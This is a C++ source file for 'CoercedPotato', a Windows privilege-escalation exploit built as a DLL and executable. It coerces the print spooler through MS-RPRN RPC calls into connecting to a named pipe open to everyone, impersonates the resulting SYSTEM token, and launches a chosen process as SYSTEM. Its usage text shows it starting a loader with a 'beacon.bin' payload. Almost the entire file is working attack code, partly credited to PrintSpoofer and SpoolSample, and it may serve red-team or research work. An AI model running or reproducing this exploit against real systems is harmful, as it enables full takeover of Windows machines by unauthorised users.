#pragma once

#include <iostream>
#include <Windows.h>
#include <sddl.h>
#include <userenv.h>
#include <thread>
#include <tchar.h>
#include <string>
#include <locale>
#include <functional>
#include <rpc.h> 
#include <strsafe.h>
#include <winsdkver.h>
#define _WIN32_WINNT 0x0601
#include <sdkddkver.h>


#include "lib/ms-efsr_h.h"
#include "lib/ms-rprn_h.h"
#include "CoerceFunctions.h"
#include "Arguments.h"

#pragma comment(lib, "RpcRT4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning( disable : 28251 )

LPWSTR g_pwszProcessName = NULL;
LPWSTR g_pwszCommandLine = NULL;
BOOL g_bInteractWithConsole = false;

struct NamedPipeThreadArgs {
    LPWSTR commandLine;
    const wchar_t* pipePath;
};


void RealEntrypoint(char* argument_string);

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (lpReserved != NULL) {
            RealEntrypoint((char*)lpReserved);
        }
        else {
            printf("Error CoercedPotato requires an argument string\n");
        }

        fflush(stdout);
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



void handleError(long result) {
    wprintf(L"[*] Error code returned : %ld\r\n", result);
    if (result == 53) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else if (result == 5) {
        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one...\r\n");
    }
    else if (result == 50) {
        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one...\r\n");
    }
    else if (result == 0) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else {
        wprintf(L" -> [-] Exploit failed, unknown error, trying another function...\r\n");
    }
}

BOOL createRPCbind(RPC_BINDING_HANDLE& binding_h)
{

    RPC_STATUS status;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\localhost";

    RPC_WSTR bindingString = nullptr;
    status = RpcStringBindingCompose(
        nullptr,              // Address targeted (NULL for local binding)
        (RPC_WSTR)L"ncalrpc", // Protocol used 
        nullptr,              // Endpoint (NULL for dynamic binding)
        nullptr,              // UUID (NULL for dynamic binding)
        nullptr,              // Options (utilisez nullptr pour les options par d�faut)
        &bindingString
    );

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        return FALSE;
    }

    status = RpcBindingFromStringBinding(bindingString, &binding_h);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        RpcStringFree(&bindingString);
        return FALSE;
    }
    status = RpcStringFree(&bindingString);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
    }
    wprintf(L"[+] RPC binding with localhost done \r\n");
    return TRUE;  // Success
}

// CODE STOLEN FROM https://github.com/itm4n/PrintSpoofer/blob/master/PrintSpoofer/PrintSpoofer.cpp
BOOL GetSystem(HANDLE hPipe)
{
    DWORD g_dwSessionId = 0;
    BOOL bResult = FALSE;
    HANDLE hSystemToken = INVALID_HANDLE_VALUE;
    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };

    if (!ImpersonateNamedPipeClient(hPipe))
    {
        wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
    {
        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (g_dwSessionId)
    {
        if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
        {
            wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
            goto cleanup;
        }
    }

    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
        goto cleanup;

    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
    {
        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

    if (!CreateProcessAsUser(hSystemTokenDup, g_pwszProcessName, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
    {
        if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
        {
            wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");

            RevertToSelf();

            if (!g_bInteractWithConsole)
            {
                if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, g_pwszProcessName, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
                {
                    wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
                    goto cleanup;
                }
                else
                {
                    wprintf(L" ** Exploit completed **\n\n");
                }
            }
            else
            {
                wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
                goto cleanup;
            }
        }
        else
        {
            wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
            goto cleanup;
        }
    }
    else
    {
        wprintf(L" ** Exploit completed **\n\n");
    }

    if (g_bInteractWithConsole)
    {
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    bResult = TRUE;

cleanup:
    if (hSystemToken)
        CloseHandle(hSystemToken);
    if (hSystemTokenDup)
        CloseHandle(hSystemTokenDup);
    if (pwszCurrentDirectory)
        free(pwszCurrentDirectory);
    if (lpEnvironment)
        DestroyEnvironmentBlock(lpEnvironment);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return bResult;
}

DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
    NamedPipeThreadArgs* args = static_cast<NamedPipeThreadArgs*>(lpParam);
    LPWSTR commandLine = args->commandLine;
    const wchar_t* pipePath = args->pipePath;

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    HANDLE hTokenDup = INVALID_HANDLE_VALUE;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };
    HANDLE hToken = ((HANDLE)(LONG_PTR)-1);
    LPWSTR lpName;

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintfW(lpName, MAX_PATH, pipePath);


    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
    {
        wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
    {
        wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if ((hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
    {
        wprintf(L"[PIPESERVER] Named pipe '%ls' listening...\n\n", lpName);
        ConnectNamedPipe(hPipe, NULL);
        wprintf(L"\n[PIPESERVER] A client connected!\n\n");
        if (!GetSystem(hPipe)) {
            wprintf(L"[PIPESERVER] CreateNamedPipe() failed. Error: %d - ", GetLastError());
        }
    }
    return 0;
}

BOOL createNamedPipe(wchar_t* namedpipe, wchar_t* commandExecuted) {
    HANDLE hThread = NULL;
    NamedPipeThreadArgs poisonedNamedPipe;
    poisonedNamedPipe.pipePath = namedpipe;
    poisonedNamedPipe.commandLine = commandExecuted;
    hThread = CreateThread(NULL, 0, launchNamedPipeServer, &poisonedNamedPipe, 0, NULL);
    wprintf(L"[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe %s.\r\n", poisonedNamedPipe.pipePath);
    return TRUE;
}


long callRprnFunctions(int exploitID, bool force) {
    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions...\r\n\n");
    long result;

    LPWSTR targetedPipeName;
    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(targetedPipeName, MAX_PATH, L"\\\\127.0.0.1/pipe/coerced");


    std::function<int()> functions[] = {
        [&]() { return callRpcRemoteFindFirstPrinterChangeNotificationEx(targetedPipeName); },
        [&]() { return callRpcRemoteFindFirstPrinterChangeNotification(targetedPipeName);
    } };
    int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
    if (exploitID == -1) {
        wprintf(L"[MS-RPRN] Starting RPC functions fuzzing...\r\n");
        for (int i = 0; i < sizeOfFunctions; i++) {
            wprintf(L" [MS-RPRN] ");
            result = functions[i]();
            wprintf(L" [MS-RPRN] ");
            handleError(result);
            if (result == 0 and !force) {
                LocalFree(targetedPipeName);
                return 0;
            }
        }
    }
    else {
        wprintf(L"[MS-RPRN] ");
        result = functions[exploitID]();
        wprintf(L"[MS-RPRN] ");
        handleError(result);
    }

    LocalFree(targetedPipeName);
    if (!force) {
        wprintf(L"[MS-RPRN] None of MS-RPRN worked... \r\n\n\n");
    }
    return -1;
}


BOOL coerce()
{
    long result;
    handle_t RPCBind;
    if (!createRPCbind(RPCBind)) {
        wprintf(L"[RPCBIND] An error has occurred during the RPC binding \r\n");
        return FALSE;
    }
    Sleep(500);
    result = callRprnFunctions(-1, true) == 0;
    return result;
}

void spawn_pipe(std::string stringCommand, std::string stringArg)
{
    wchar_t* namedpipe;
    size_t maxBufferSize, maxArgSize, maxCommandLineSize = 0;

    maxBufferSize = stringCommand.size() + 1;
    maxArgSize = stringArg.size() + 1;
    maxCommandLineSize = maxBufferSize + maxArgSize;

    // convert stringCommand to LPWSTR
    const char* charPointer = stringCommand.c_str();
    
    wchar_t* process = new wchar_t[maxBufferSize];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, process, maxBufferSize, charPointer, maxBufferSize - 1);
    g_pwszProcessName = process;

    
    wchar_t* arg = new wchar_t[maxArgSize];
    wchar_t* command = new wchar_t[maxCommandLineSize];
    convertedChars = 0;
    mbstowcs_s(&convertedChars, command, maxCommandLineSize, charPointer, maxBufferSize - 1);


    // create commandline arg for CreateProcess*
    // commandline = process + arg
    if (stringArg != "")
    {
        charPointer = stringArg.c_str();
        maxBufferSize = stringArg.size() + 1;

        convertedChars = 0;
        mbstowcs_s(&convertedChars, arg, maxArgSize, charPointer, maxArgSize - 1);
        
        wcsncat_s(command, maxCommandLineSize, L" ", 1);
        wcsncat_s(command, maxCommandLineSize, arg, wcslen(arg));

        g_pwszCommandLine = command;
    }

    g_bInteractWithConsole = false;

    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\spoolss");
    NamedPipeThreadArgs poisonedNamedPipe;
    poisonedNamedPipe.pipePath = namedpipe;
    poisonedNamedPipe.commandLine = command;

    launchNamedPipeServer(&poisonedNamedPipe);
}

void RealEntrypoint(char* argument_string) {

    try {
        Arguments args = Arguments(argument_string);

        if (args.Action == "spawn")
        {
            spawn_pipe(args.ProcessName, args.Argument);
        }
        else if (args.Action == "coerce")
        {
            coerce();
        }
    } catch (const std::invalid_argument&) {
        std::cout << "Spawn Usage: CoercePotato spawn process_path optional_arg_for_process" << std::endl;
        std::cout << "Spawn Usage: CoercePotato coerce" << std::endl;
        std::cout << "Example:" << std::endl;
        std::cout << "\tCoercePotato spawn C:\\Windows\\Temp\\loader.exe C:\\Windows\\Temp\\beacon.bin" << std::endl;
        std::cout << "\tCoercePotato coerce" << std::endl;
        std::cout << std::flush;
    }
    
}


int main(int argc, char** argv)
{
    if (argc != 2)
    {
        printf("Args invalid\n");
        return -1;
    }
    RealEntrypoint(argv[1]);
}



/** ALL FUNCTIONS USEFUL FOR RPC INTERFACES **/

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}

// Taken from https://github.com/leechristensen/SpoolSample/blob/master/MS-RPRN/main.cpp 
handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
    RPC_STATUS RpcStatus;
    RPC_WSTR StringBinding;
    handle_t BindingHandle;
    WCHAR   ServerName[MAX_PATH + 1];
    DWORD   i;

    if (lpStr && lpStr[0] == L'\\' && lpStr[1] == L'\\') {
        ServerName[0] = ServerName[1] = '\\';

        i = 2;
        while (lpStr[i] && lpStr[i] != L'\\' && i < sizeof(ServerName)) {
            ServerName[i] = lpStr[i];
            i++;
        }

        ServerName[i] = 0;
    }
    else {
        return FALSE;
    }

    RpcStatus = RpcStringBindingComposeW(
        (RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB",
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)ServerName,
        (RPC_WSTR)L"\\pipe\\spoolss",
        NULL,
        &StringBinding);

    if (RpcStatus != RPC_S_OK) {
        return(0);
    }

    RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

    RpcStringFreeW(&StringBinding);

    if (RpcStatus != RPC_S_OK) {
        wprintf(L"[-] An error has occurred during STRING_HANDLE_bind()...\r\n");
        return(0);
    }

    return(BindingHandle);
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
    RPC_STATUS       RpcStatus;

    RpcStatus = RpcBindingFree(&BindingHandle);
    if (RpcStatus == RPC_S_INVALID_BINDING) wprintf(L"[-] An error has occurred during STRING_HANDLE_unbind()...\r\n");

    return;
}
